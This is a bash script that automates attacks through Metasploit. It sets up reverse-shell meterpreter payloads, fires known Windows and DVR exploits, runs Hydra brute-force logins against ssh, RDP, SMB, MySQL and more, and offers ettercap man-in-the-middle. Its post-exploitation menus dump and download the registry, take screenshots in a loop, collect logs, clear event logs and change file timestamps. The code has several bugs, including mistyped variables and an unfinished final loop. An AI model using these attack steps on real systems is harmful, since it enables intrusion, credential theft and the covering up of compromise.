#!/bin/bash
source $1
if [ -z $1 ]; then # Defaults if no arg passed
	#Enter your defaults:  (LHOST is discovered as a 'hostname -I' command)
	RHOST="192.168.0.3"
	RHOSTS="192.168.0.0/24"
	LPORT="4433"
	wspace="default"
	passfile="/wls/rockyou.txt"
	uusers="/wls/admins"
	BRUTEFORCE_SPEED="1"
	BLANK_PASSWORDS="true"
	STOP_ON_SUCCESS="true"
	nmapPath="/media/SCANS/nmap/"
	fi
#  =============== set up  ===============
function defaultMenu ()
	{
		# Main Menu Items
		mainMenuAction1="use exploit/windows/smb/ms08_067_netapi"
		mainMenuText1="ms08_067_netapi"

		mainMenuAction2="use exploit/windows/dcerpc/ms03_026_dcom"
		mainMenuText2="ms03_026_dcom"

		mainMenuAction3="use exploit/windows/smb/ms10_061_spoolss"
		mainMenuText3="ms10_061_spoolss"

		mainMenuAction4="auxiliary/scanner/smb/smb_lookupsid"
		mainMenuText4="smb_lookupsid"

		mainMenuAction5="use exploit/windows/local/ms10_015_kitrap0d"
		mainMenuText5="ms10_015_kitrap0d"

		mainMenuAction6="use exploit/multi/handler"
		mainMenuText6="exploit/multi/handler"

		mainMenuAction7=""
		mainMenuText7=""

		mainMenuAction8="use auxiliary/scanner/smb/smb_enumshares"
		mainMenuText8="smb_enumshares"

		mainMenuAction9="use auxiliary/scanner/smb/smb_enumusers"
		mainMenuText9="smb_enumusers"

		mainMenuAction10="use aauxiliary/scanner/smb/smb_enumusers_domain"
		mainMenuText10="smb_enumusers_domain"

		mainMenuAction11="use exploit/windows/smb/psexec"
		mainMenuText11="psexec"

		mainMenuAction12="use auxiliary/scanner/smb/smb_login"
		mainMenuText12="smb_login"

		mainMenuAction13="use auxiliary/scanner/vnc/vnc_login"
		mainMenuText13="vnc_login"

		mainMenuAction14="use auxiliary/gather/avtech744_dvr_accounts"
		mainMenuText14="avtech744_dvr_accounts"

		mainMenuAction15="use auxiliary/scanner/misc/cctv_dvr_login"
		mainMenuText15="cctv_dvr_login"

		mainMenuAction16="use auxiliary/scanner/misc/dvr_config_disclosure"
		mainMenuText16="dvr_config_disclosure"

		mainMenuAction17="use auxiliary/scanner/misc/raysharp_dvr_passwords"
		mainMenuText17="raysharp_dvr_passwords"

		mainMenuAction18="use exploit/linux/misc/hikvision_rtsp_bof"
		mainMenuText18="hikvision_rtsp_bof"
	}

function initz ()
	{
		clear
		Blk='\e[1;30m'         # Black
		Red='\e[1;31m'         # Red
		Green='\e[1;32m'       # Green
		Yellow='\e[1;33m'      # Yellow
		Blue='\e[1;34m'        # Blue
		Purple='\e[1;35m'      # Purple
		Cyan='\e[1;36m'        # Cyan
		White='\e[1;37m'       # White
		BBlue='\e[44m'
		#BBlack='\e[40m'
		#BBlack='\e[0;100m'
		BBlack='\e[0m'
		LHOST="$(hostname -I)"
		echo -e "${White} List of IPs assigned to this machine"
		echo "Chose for LHOST"
		echo
		echo $LHOST
		echo " Enter 1, 2, 3, etc"
		read l
		arr=($LHOST)
		LHOST=${arr[l-1]}
		echo $LHOST
		echo
		echo
		echo
		echo " Run the command tty in the msfconsole window and in the secondary window"
		echo " Enter in just the number into following:"
		echo
		# if [ -z $ptts ]; then
		# 	echo -e "${White} enter pts # of msfconsole ${Purple}"
		# 	read ppts
		# 	ppts="/dev/pts/"$ppts
		# 	echo  $ppts
		# fi
		# if [ -z $ptts2 ]; then
		# 	echo -e "${White} enter pts # of secondary shell ${Purple}"
		# 	read ppts2
		# 	ppts2="/dev/pts/"$ppts2
		# 	echo  $ppts2
		# fi
	}

function startTerms ()
	{
		gnome-terminal --tab -t "Metasploit" --profile Pro2 -e "bash -c 'ttymsf';bash"
		sleep 3 
		gnome-terminal --tab -t "Other Attacks" --profile Pro -e "bash -c 'ttyother';bash"
		source ./msf.tty
		ppts=$msfCon
		ppts2=$otherCon
	}

function loadMenuSet ()
	{
		echo "yellow"
	}

function setup() # ======================  Set Up =======================
	{
		clear
		echo
		echo
		echo " Run the command tty in the msfconsole window and in the secondary window"
		echo " Enter in just the number into following:"
		echo 
		echo -e "${White} enter pts # of msfconsole ${Purple}"
		read ppts
		ppts="/dev/pts/"$ppts
		echo  $ppts
		echo -e "${White} enter pts # of secondary shell ${Purple}"
		read ppts2
		ppts2="/dev/pts/"$ppts2
		echo  $ppts2
		echo
		echo -e "${White}Enter Workspace ${Purple}"
		read wspace
		if [ -z $wspace ]; then
			wspace="default"
		    fi
		echo -e "${White}Enter global RHOST (${RHOST}) ${Purple}"
		read RHOST
		if [ -z $RHOST ]; then
			RHOST="192.168.1.50"
			fi
		echo -e "${White}Enter global RHOSTS (${RHOSTS}) ${Purple}"
		read RHOSTS
		if [ -z $RHOSTS ]; then
			RHOSTS="192.168.1.0/24"
		   	fi
		echo -e "${White}Enter global LHOST (${LHOST}) ${Purple}"
		read LHOST
		if [ -z $LHOST ]; then
			cli="$(hostname -I)"
			LHOST=($cli)
		    fi
		echo -e "${White}Enter global LPORT (${LPORT}) ${Purple}"
		read LPORT
		if [ -z $LPORT ]; then
			LPORT="4433"
		    fi
		echo -e "${White}Enter global payload (${payload}) ${Purple}"
		read payload
		if [ -z $payload ]; then
			payload="windows/meterpreter/reverse_tcp"
			fi
		echo -e "${White}Enter global usernmae or FQ file (${uusers}) ${Purple}"
		read uusers
		if [ -z $ussers ]; then
			uusers="/wls/u1"
			fi
		echo -e "${White}Enter global FQ Password file(${passfile}) ${Purple}"
		read passfile
		if [ -z $passfile ]; then
			passfile="/wls/rockyou.txt"
			fi
		echo
		echo -e "${White} -------------${Red}-------------${White}-------------"
		echo
		cli="ttyecho -n ${ppts} workspace -a ${wspace}"
		eval $cli
		cli="ttyecho -n ${ppts} setg RHOST ${RHOST}"
		eval $cli
		cli="ttyecho -n ${ppts} setg RHOSTS ${RHOSTS}"
		eval $cli
		cli="ttyecho -n ${ppts} setg LHOST ${LHOST}"
		eval $cli
		cli="ttyecho -n ${ppts} setg LPORT ${LPORT}"
		eval $cli
		cli="ttyecho -n ${ppts} setg PAYLOAD ${payload}"
		eval $cli
		cli="ttyecho -n ${ppts} setg USER_FILE ${uusers}"
		eval $cli
	   	cli="ttyecho -n ${ppts} setg BLANK_PASSWORDS   ${BLANK_PASSWORDS}"
	    eval $cli
		cli="ttyecho -n ${ppts} setg STOP_ON_SUCCESS   ${STOP_ON_SUCCESS}"
	   	eval $cli
		cli="ttyecho -n ${ppts} setg BRUTEFORCE_SPEED  ${BRUTEFORCE_SPEED}"
	   	eval $cli
	   	cli="ttyecho -n ${ppts} setg VERBOSE false"
	   	eval $cli
	}

function setup2() #  ==================== set up2  ======================
	{

		clear
		echo -e "${BBlue} ${White}                    Meta Play Ground                       ${BBlack}"
		echo -e "${White} 1... RHOST: ${Red} \t" $RHOST 
		echo -e "${White} 2... RHOSTS: ${Green} \t" $RHOSTS
		echo -e "${White} 3... LHOST: ${Red} \t" $LHOST 
		echo -e "${White} 4... LPORT: ${Red} \t" $LPORT
		echo -e "${White} 5... Payload: ${Red} \t" $payload 
		echo -e "${White} 6... Workspace:${Red} \t" $wspace
		echo -e "${White} 7... Metasploit /dev/pts/x: ${Red} \t" $ppts
		echo -e "${White} 8... Other Shell /dev/pts/x:${Red} \t" $ppts2
		echo -e "${White} 9... Username File (FQP): ${Red} \t" $uusers
		echo -e "${White} 10.. Password File (FQP): ${Red} \t" $passfile
		echo -e "${White} 11.. BLANK_PASSWORDS: ${Red} \t" $BLANK_PASSWORDS
		echo -e "${White} 12.. STOP_ON_SUCCESS: ${Red} \t" $STOP_ON_SUCCESS
		echo -e "${White} 13.. BRUTEFORCE_SPEED (0-5):${Red} \t" $BRUTEFORCE_SPEED
		echo -e "${White} 14.. Load cfg file : ${Red}"
		echo -e "${White} 15.. Set Auto migrate: ${Red}"
		# echo -e "${White} 16.. : ${Red}"
		# echo -e "${White} 17.. : ${Red}"
		# echo -e "${White} 18.. : ${Red}"
		# echo -e "${White} 19.. : ${Red}"
		# echo -e "${White} 20.. : ${Red}"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " x ...Exit   a....Write all"
		echo "  Choice: "
		read pick
		if [ -z $pick ]; then
				setup2
			fi
		if [ $pick = 1 ]; then
			read -e -i $RHOST -p "Please enter new RHOST: " input
			RHOST="${input:-$RHOST}"
			cli="ttyecho -n ${ppts} setg RHOST ${RHOST}"
			$cli
		fi
		if [ $pick = 2 ]; then
			read -e -i $RHOSTS -p "Please enter new RHOSTS: " input
			RHOSTS="${input:-$RHOSTS}"
			cli="ttyecho -n ${ppts} setg RHOSTS ${RHOSTS}"
			eval $cli
		fi
		if [ $pick = 3 ]; then
			read -e -i $LHOST -p "Please enter new LHOST: " input
			LHOST="${input:-$LHOST}"
			cli="ttyecho -n ${ppts} setg LHOST ${LHOST}"
			eval $cli
		fi
		if [ $pick = 4 ]; then
			echo -e "\n Enter New LPORT:"
			read LPORT
			cli="ttyecho -n ${ppts} setg LPORT ${LPORT}"
			eval $cli
		fi
		if [ $pick = 5 ]; then
			pickpayload
		fi
		if [ $pick = 6 ]; then
			echo -e "\n Enter New Workspace:"
			read wspace
			cli="ttyecho -n ${ppts} workspace -a ${wspace}"
			eval $cli
		fi
		if [ $pick = 7 ]; then
			echo -e "\n Enter New Metasploit Shell:"
			read ppts
			ppts="/dev/pts/"$ppts
		fi
		if [ $pick = 8 ]; then
			echo -e "\n Enter New Other Shell:"
			read ppts2
			ppts2="/dev/pts/"$ppts2
		fi
		if [ $pick = 9 ]; then
			echo -e "\n Enter New username File: <enter for list>"
			read uusers
			if [ -z $ussers ]; then
				fileSpec="${passDIR}*"
				fileMenu
				echo fileTemp
				uusers=$fileTemp
			fi
			cli="ttyecho -n ${ppts} setg USER_FILE ${uusers}"
			eval $cli
		fi
		if [ $pick = 10 ]; then
			echo -e "\n Enter New password File: <enter for list>"
			read passfile
				if [ -z $passfile ]; then
				fileSpec="${userDIR}*"
				fileMenu
				echo fileTemp
				passfile=$fileTemp
			fi
			cli="ttyecho -n ${ppts} setg PASS_FILE ${passfile}"
	   		eval $cli
		fi
		if [ $pick = 11 ]; then
			echo -e "\n Allow Blank Passwords? y/n:"
			read Bp
			if [ $bp = "y" ]; then
				BLANK_PASSWORDS="true"
			fi
			if [ $Bp = "n" ]; then
				BLANK_PASSWORDS="false"
			fi
			   	cli="ttyecho -n ${ppts} setg BLANK_PASSWORDS   ${BLANK_PASSWORDS}"
	   			eval $cli
		fi
		if [ $pick = 12 ]; then
			echo -e "\n Stop on Success y/n:"
			read Bp
			if [ $bp = "y" ]; then
				STOP_ON_SUCCESS="true"
			fi
			if [ $Bp = "n" ]; then
				STOP_ON_SUCCESS="false"
			fi
			cli="ttyecho -n ${ppts} setg STOP_ON_SUCCESS   ${STOP_ON_SUCCESS}"
	   		eval $cli
		fi
		if [ $pick = 13 ]; then
			echo -e "\n Enter New Brute Force Speed 0-5:"
			read BRUTEFORCE_SPEED
			cli="ttyecho -n ${ppts} setg BRUTEFORCE_SPEED  ${BRUTEFORCE_SPEED}"
	   		eval $cli
		fi
		if [ $pick = 14 ]; then
			fileSpec="*.cfg"
			fileMenu
			echo fileTemp
	   		source $fileTemp
		fi
		if [ $pick = 15 ]; then
			inject="setg AutoRunScript post/windows/manage/migrate"
			cli="ttyecho -n ${ppts} ${inject}"
			echo $cli
			read Q
			eval $cli
		fi
		if [ $pick = "x" ]; then
			mainmenu
		fi
			if [ $pick = "a" ]; then
			sendall
		fi
	   	setup2
	}	

function pickpayload () # ============== Pick Payload ===================
	{
		echo
		echo " Pick Payload"
		echo "1...windows/meterpreter/reverse_tcp"
		echo "2...payload=linux/armle/shell_reverse_tcp"
		echo "3...payload/generic/shell_reverse_tcp "
		echo "4...payload/linux/armle/shell/reverse_tcp"
		echo "5...payload/linux/mipsle/shell_reverse_tcp"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " 0...ReRun setup   o...Other Attacks  r....Recon    s...save   m....meterpreter"
		echo "  Choice: "
		read pick
			if [ $pick = 1 ]; then
				payload="windows/meterpreter/reverse_tcp"
				cli="ttyecho -n ${ppts} ${inject}"
				eval $cli
				inejct="set AutoRunScript post/windows/manage/migrate"
			fi
				if [ $pick = 2 ]; then
				payload="linux/armle/shell_reverse_tcp"
			fi
				if [ $pick = 3 ]; then
				payload="generic/shell_reverse_tcp "
			fi
				if [ $pick = 4 ]; then
				payload="linux/armle/shell/reverse_tcp"
			fi
				if [ $pick = 5 ]; then
				payload="linux/mipsle/shell_reverse_tcp"
			fi
			inject="set payload ${payload}"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
	}

function mainmenu () # =================== Main Menu  ===================
	{
		clear
		echo -e "${BBlue} ${White}                    Meta Play Ground                       ${BBlack}"
		echo -e "${White} RHOST: ${Red}" $RHOST "${White} \t RHOSTS: ${Green}" $RHOSTS
		echo -e "${White} LHOST: ${Red}" $LHOST "${White}\t LPORT: ${Red}" $LPORT
		echo -e "${White} Payload: ${Red}" $payload "\t  ${White} Workspace:${Red}" $wspace
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " 1...${mainMenuText1}"
		echo " 2...${mainMenuText2}"
		echo " 3...${mainMenuText3}"
		echo " 4...${mainMenuText4}"
		echo " 5...${mainMenuText5}"
		echo " 6...${mainMenuText6}"
		echo " 7...Workspace"
		echo " 8...${mainMenuText8}"
		echo " 9...${mainMenuText9}"
		echo "10...${mainMenuText10}"
		echo "11...${mainMenuText11}"
		echo "12...${mainMenuText12}"
		echo "13...${mainMenuText13}"
		echo "14...${mainMenuText14}"
		echo "15...${mainMenuText15}"
		echo "16...${mainMenuText16}"
		echo "17...${mainMenuText17}"
		echo "18...${mainMenuText18}"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " 0...ReRun setup   o...Other Attacks  r....Recon    s...save   m....meterpreter"
		echo "  Choice: "
		read pick
		if [ $pick = 1 ]; then
			inject=$mainMenuAction1
			cli="ttyecho -n ${ppts} ${inject}"
		fi
		if [ $pick = 2 ]; then
			inject=$mainMenuAction2
			cli="ttyecho -n ${ppts} ${inject}"
		fi
		if [ $pick = 3 ]; then
			inject=$mainMenuAction3
			cli="ttyecho -n ${ppts} ${inject}"
		fi
		if [ $pick = 4 ]; then
			inject=$mainMenuAction4
		fi
		if [ $pick = 5 ]; then
			inject=$mainMenuAction5
		fi
		if [ $pick = 6 ]; then
			inject=$mainMenuAction6
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
		fi
		if [ $pick = 7 ]; then
			echo
			echo -e "Enter new workspace"
			read wspace
			inject="workspace -a ${wspace}"
		fi
		if [ $pick = 8 ]; then
			inject=$mainMenuAction8
		fi
		if [ $pick = 9 ]; then
			inject=$mainMenuAction9
		fi
		if [ $pick = 10 ]; then
			inject=$mainMenuAction10
		fi
		if [ $pick = 11 ]; then
			inject=$mainMenuAction11
		fi
		if [ $pick = 12 ]; then
			inject=$mainMenuAction12
		fi
		if [ $pick = 13 ]; then
			inject=$mainMenuAction13
	 	fi
		if [ $pick = 14 ]; then
			 inject=$mainMenuAction14
	 	fi
		if [ $pick = 15 ]; then
			  inject=$mainMenuAction15
	 	fi
		if [ $pick = 16 ]; then
			  inject=$mainMenuAction16
	 	fi
		if [ $pick = 17 ]; then
			  inject=$mainMenuAction17
	 	fi
		if [ $pick = 18 ]; then
				inject=$mainMenuAction18
		 	fi
		 	#----------------------
			if [ $pick = 0 ]; then
				setup2
				mainmenu
			fi
			if [ $pick = "o" ]; then
					other
			fi
			if [ $pick = "m" ]; then
					mpreter
			fi
			if [ $pick = "r" ]; then
					recon
			fi
			if [ $pick = "s" ]; then
					saveconfig
					inject=""
					mainmenu
			fi
		 	#----------------------
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			cli="ttyecho -n ${ppts} show options"
			eval $cli
			mainmenu
	}

function other ()  # ================== Secondary Menu ==================
	{
		clear
		echo -e "${BBlue} ${Red}                    Other Ground                       ${BBlack}"
		echo -e "${White} RHOST: ${Red}" $RHOST "${White} \t RHOSTS: ${Green}" $RHOSTS
		echo -e "${White} LHOST: ${Red}" $LHOST "${White} \t LPORT: ${Red}" $LPORT
		echo -e "${White} Userfile: ${Red}" $uusers "\t  ${White} Passfile:${Red}" $passfile
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " 1...WordPress Scan"
		echo " 2...Hydra Attack ssh"
		echo " 3...Hydra Attack Router (http-get)"
		echo " 4...Hydra Attack POP3"
		echo " 5...Hydra Attack RDP"
		echo " 6...Hydra Attack Telnet"
		echo " 7...Hydra Attack VNC"
		echo " 8...Hydra Attack MySQL"
		echo " 9...Hydra Attack SMB"
		echo "10...ettercap MITM meterpreter"
		echo "11...Screenshot non stop"  # =========================================== UNTESTED
		echo "12...Get Registry"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo -e " Most Hydra attacks stop on first correct combo"
		echo " 0...ReRun setup   x...Main Menu"
		echo "  Choice: "
		read pick
		if [ $pick = 1 ]; then
			inject="wpscan --url ${RHOST} --enumerate"
		fi
		if [ $pick = 2 ]; then
			inject="hydra -o /root/creds/hydra-ssh.txt -t 4 -f -V -L ${uusers} -P ${passfile}  ${RHOST} ssh"
		fi
		if [ $pick = 3 ]; then
			inject="hydra -o /root/creds/hydra-router.txt -f -V -L ${uusers} -P ${passfile}  ${RHOST} http-get"
		fi
		if [ $pick = 4 ]; then
			inject="hydra -o /root/creds/hydra-pop.txt  -V -L ${uusers} -P ${passfile}  ${RHOST} pop3"
		fi
		if [ $pick = 5 ]; then
			inject="hydra -o /root/creds/hydra-rdp.txt -f -V -L ${uusers} -P ${passfile}  ${RHOST} rdp"
		fi
		if [ $pick = 6 ]; then
			inject="hydra -o /root/creds/hydra-telnet.txt -f -V -L ${uusers} -P ${passfile}  ${RHOST} telnet"
		fi
		if [ $pick = 7 ]; then
			inject="hydra -o /root/creds/hydra-vnc.txt -f -V -P ${passfile}  ${RHOST} vnc"
		fi
		if [ $pick = 8 ]; then
			inject="hydra -o /root/creds/hydra-mysql.txt -f -V -L ${uusers} -P ${passfile}  ${RHOST} mysql"
		fi
		if [ $pick = 9 ]; then
			inject="hydra -o /root/creds/hydra-smb.txt -t 1  -V -L ${uusers} -P ${passfile}  ${RHOST} smb"
		fi
		if [ $pick = 10 ]; then
			inject="ttyecho -n ${ppts2} etfmim ${LHOST} ${LPORT} "
		fi
		if [ $pick = 12 ]; then

			inject="shell"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="reg export HKLM\ c:\HKLM.REG "
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="reg export HKCU\ c:\HCCU.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="reg export HKCR\ c:\HKCR.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="reg export HKU\ c:\HKU.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="reg export HKCC\ c:\HKCC.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			echo "wait pre-exit 20"
			sleep 20
			inject="exit"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			echo "wait p-exit 10"
			sleep 10
			inject="download *.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			echo "wait for DL 240"
			sleep 240
			inject="shell"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="del *.REG"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="exit"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			cli=""
		fi
		if [ $pick = 11 ]; then
		# ----------------------------- UnTessted seciont  meterperter screenshot
				pop=0
				cnt=1
				while [ $pop = "0" ]; do
				        #cli1="ttyecho -n /dev/pts/2 screenshot -p cm-"
				        if [ $cnt -lt  10000  ]; then
				                pad="00"
				        fi
				        if [ $cnt -lt 1000 ]; then
				                pad="000"
				        fi
				        if [ $cnt -lt 100 ]; then
				                pad="0000"
				        fi
				        if [ $cnt -lt 10 ]; then
				                pad="00000"
				        fi
				        cli="ttyecho -n ${ppts} screenshot -p cm-${pad}${cnt}.jpeg"
				        echo "PAD: " $pad
				        echo "CLI: " $cli
				        eval $cli
				        cnt=$[$cnt +1]
				        echo $cnt
				        sleep 1
				done
		fi
		if [ $pick = 0 ]; then
			setup2
			other
		fi
		if [ $pick = "x" ]; then
	 		mainmenu
	 		fi
		cli="ttyecho -n ${ppts2} ${inject}"
		eval $cli
		other
	}

function recon () #  ======================= RECON  =====================
	{
		clear
		echo -e "${BBlue} ${White}                    Meta Play Recon                      ${BBlack}"
		echo -e "${White} RHOST: ${Red}" $RHOST "${White} \t DHOSTS: ${Green}" $RHOSTS
		echo -e "${White} LHOST: ${Red}" $LHOST "${White} \t LPORT: ${Red}" $LPORT
		echo -e "${White} Payload: ${Red}" $payload "\t  ${White} Workspace:${Red}" $wspace
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo -e "${White} 1... nmap Full TCP : ${Red} \t"
		echo -e "${White} 2... smb-check-vulns Unsafe: ${Red} \t"
		echo -e "${White} 3... nmap rdp ms12_020: ${Red} \t"
		echo -e "${White} 4... nmap IMAP BruteForce: ${Red}  USERS:${uusers}\tPWs:${passfile}"
		echo -e "${White} 5... nmap Quick Scan Plus: ${Red} ${RHOSTS}\t"
		echo -e "${White} 6... Delete me from db hosts : ${Red} \t${LHOST}"
		echo -e "${White} 7... : ${Red} \t"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo -n " x ...Exit   "
		echo "  Choice: "
		read pick
		if [ $pick = 1 ]; then
			cli="ttyecho -n ${ppts2} nmap -sV -p 1-65535 -T4 -A -v -oX ${nmapPath}${wspace}.xml  --exclude ${LHOST} ${RHOSTS}"
			eval $cli
		fi
		if [ $pick = 2 ]; then
			cli="ttyecho -n ${ppts2} nmap --script smb-check-vulns.nse -p445 ${RHOSTS} --script-args unsafe=1"
			eval $cli
		fi
		if [ $pick = 3 ]; then
			cli="ttyecho -n ${ppts2} nmap -sV --script=rdp-ms12-020 -p 3389 ${RHOST}"
			eval $cli
		fi
		if [ $pick = 4 ]; then
			cli="ttyecho -n ${ppts2} nmap -p 143,993 --script imap-brute --script-args userdb=${uusers}  passdb=${passfile}  ${RHOST}"
			eval $cli
		fi
		if [ $pick = 5 ]; then
			cli="ttyecho -n ${ppts} db_nmap -sV -T4 -O -F --version-light ${RHOSTS} --exclude ${LHOST}"
			eval $cli
		fi
		if [ $pick = 6 ]; then
			cli="ttyecho -n ${ppts} hosts -d  ${LHOST}"
			eval $cli
		fi
		if [ $pick = "x" ]; then
			mainmenu
		fi
		if [ -z $pick ]; then
			recon
		fi
		recon
	}

function fileMenu() # =====================File Menu ====================
	{
		PS3="Your choice: "
		select FILENAME in $fileSpec;
		do
	        fileTemp=$(echo $FILENAME | awk '{print $1}')
	  		break
		done
	}

function mpreter () #==================== meterpreter ===================
	{
		clear
		echo -e "${BBlue} ${White}                    Meta Play Recon                      ${BBlack}"
		echo -e "${White} RHOST: ${Red}" $RHOST "${White} \t DHOSTS: ${Green}" $RHOSTS
		echo -e "${White} LHOST: ${Red}" $LHOST "${White} \t LPORT: ${Red}" $LPORT
		echo -e "${White} Payload: ${Red}" $payload "\t  ${White} Workspace:${Red}" $wspace
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo -e "${White} 1... Get CM-K Logs : ${Red} \t" 
		echo -e "${White} 2... Clear Logs: ${Red} \t"
		echo -e "${White} 3... Timestomp (random): ${Red} \t"
		echo -e "${White} 4... : ${Red} \t"
		echo -e "${White} 5... : ${Red} \t"
		echo -e "${White} 6... : ${Red} \t"
		echo -e "${White} 7... : ${Red} \t"
		echo -e "${White} -------------${Cyan}-------------${White}-------------"
		echo " x ...Exit   a....Write all"
		echo "  Choice: "
		read pick
		if [ $pick = 1 ]; then
			inject="run file_collector.rb -d C:\\ -r -f *.log -o /logs.txt"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
			inject="run file_collector.rb  -i /klogs.txt -l /mss/dlfiles/logs.txt"
			cli="ttyecho -n ${ppts} ${inject}"
			eval $cli
		fi
		if [ $pick = 2 ]; then
			cli=""clearev""
			$cli
		fi
		if [ $pick = 3 ]; then
			echo
			echo "Enter year for timestamp"
			read ryear
			rtstamp="$(rantom ${ryear})"
			inject="timestomp ${rtstamp}"
			cli="ttyecho ${ppts} ${inject}"
			eval $cli
		fi
		if [ $pick = "x" ]; then
			mainmenu
		fi
	}

function sendall () #  =================== Sendall  =====================
	{
			cli="ttyecho -n "
			eval $cli
			cli="ttyecho -n "
			eval $cli
			cli="ttyecho -n ${ppts} setg RHOST ${RHOST}"
			eval $cli
			cli="ttyecho -n ${ppts} setg RHOSTS ${RHOSTS}"
			eval $cli
			cli="ttyecho -n ${ppts} setg LHOST ${LHOST}"
			eval $cli
			cli="ttyecho -n ${ppts} setg LPORT ${LPORT}"
			eval $cli
			cli="ttyecho -n ${ppts} setg PAYLOAD ${payload}"
			eval $cli
			cli="ttyecho -n ${ppts} workspace -a ${wspace}"
			eval $cli
			cli="ttyecho -n ${ppts} setg USER_FILE ${uusers}"
			eval $cli
			cli="ttyecho -n ${ppts} setg PASS_FILE ${passfile}"
	   		eval $cli
			cli="ttyecho -n ${ppts} setg BLANK_PASSWORDS   ${BLANK_PASSWORDS}"
	   		eval $cli
			cli="ttyecho -n ${ppts} setg STOP_ON_SUCCESS   ${STOP_ON_SUCCESS}"
	   		eval $cli
			cli="ttyecho -n ${ppts} setg BRUTEFORCE_SPEED  ${BRUTEFORCE_SPEED}"
	   		eval $cli
	   		setup2
	}

function saveconfig () # ============== Save defaults ===================
	{
		echo
		echo
		echo "Enter FQ filename (./${wspace}.cfg)"
		read fname
		if [ -z $fname ]; then
			fname=$wspace
		fi
		fname=$fname".cfg"
		echo "RHOST='${RHOST}'" > $fname
		echo "RHOSTS='${RHOSTS}'" >> $fname
		echo "LHOST='${LHOST}'" >> $fname
		echo "LPORT='${LPORT}'" >> $fname
		echo "wspace='${wspace}'" >> $fname
		echo "payload='${payload}'" >> $fname
		echo "uusers='${uusers}'" >> $fname
		echo "passfile='${passfile}'" >> $fname
		echo "BRUTEFORCE_SPEED='${BRUTEFORCE_SPEED}'" >> $fname
		echo "BLANK_PASSWORDS='${BLANK_PASSWORDS}'" >> $fname
		echo "STOP_ON_SUCCESS='${STOP_ON_SUCCESS}'" >> $fname
		echo "nmapPath='${nmapPath}'" >> $fname
		echo "" >> $fname
		echo "# Directories" >> $fname
		echo "# username files location" >> $fname
		echo "userDIR='/wls/'" >> $fname
		echo "" >> $fname
		echo "# Password file location" >> $fname
		echo "passDIR='/wls/'" >> $fname
		echo "" >> $fname
		echo "# nmap saves location" >> $fname
		echo "nmapPath='/media/SCANS/nmap/'" >> $fname
		echo "" >> $fname
		echo " Main Menu Items" >> $fname
		echo "# ActionX = msfconsole command" >> $fname
		echo "#   TextX = what is" >> $fname
		echo "" >> $fname
		echo "" >> $fname
		echo "#  Main Menu Items" >> $fname
		echo "" >> $fname
		echo "" >> $fname
		echo "mainMenuAction1='${mainMenuAction1}'" >> $fname
		echo "mainMenuText1='${mainMenuText1}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction2='${mainMenuAction2}'" >> $fname
		echo "mainMenuText2='${mainMenuText2}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction3='${mainMenuAction3}'" >> $fname
		echo "mainMenuText3='${mainMenuText4}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction4='${mainMenuAction4}'" >> $fname
		echo "mainMenuText4='${mainMenuText4}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction5='${mainMenuAction5}'" >> $fname
		echo "mainMenuText5='${mainMenuText5}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction6='${mainMenuAction6}'" >> $fname
		echo "mainMenuText6='${mainMenuText6}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction7=''" >> $fname
		echo "mainMenuText7=''" >> $fname
		echo "" >> $fname
		echo "mainMenuAction8='${mainMenuAction8}'" >> $fname
		echo "mainMenuText8='${mainMenuText8}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction9='${mainMenuAction9}'" >> $fname
		echo "mainMenuText9='${mainMenuText9}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction10='${mainMenuAction10}'" >> $fname
		echo "mainMenuText10='${mainMenuText10}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction11='${mainMenuAction11}'" >> $fname
		echo "mainMenuText11='${mainMenuText11}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction12='${mainMenuAction12}'" >> $fname
		echo "mainMenuText12='${mainMenuText12}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction13='${mainMenuAction13}'" >> $fname
		echo "mainMenuText13='${mainMenuText13}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction14='${mainMenuAction14}'" >> $fname
		echo "mainMenuText14='${mainMenuText14}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction15='${mainMenuAction15}'" >> $fname
		echo "mainMenuText15='${mainMenuText15}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction16='${mainMenuAction16}'" >> $fname
		echo "mainMenuText16='${mainMenuText16}'" >> $fname
		echo "" >> $fname
		echo "mainMenuAction17='${mainMenuAction17}'" >> $fname
		echo "mainMenuText17='${mainMenuText17}" >> $fname
		echo "" >> $fname
		echo "mainMenuAction18='${mainMenuAction18}'" >> $fname
		echo "mainMenuText18='${mainMenuText18}'" >> $fname

	}



# ---------------------------------------------
#                  Main Loop
# ---------------------------------------------
startTerms
initz
if [ -z $1 ]; then
	setup
fi
if [ -z $mainMenuAction1 ]; then
	defaultMenu
fi
sendall

while [ 1 ]
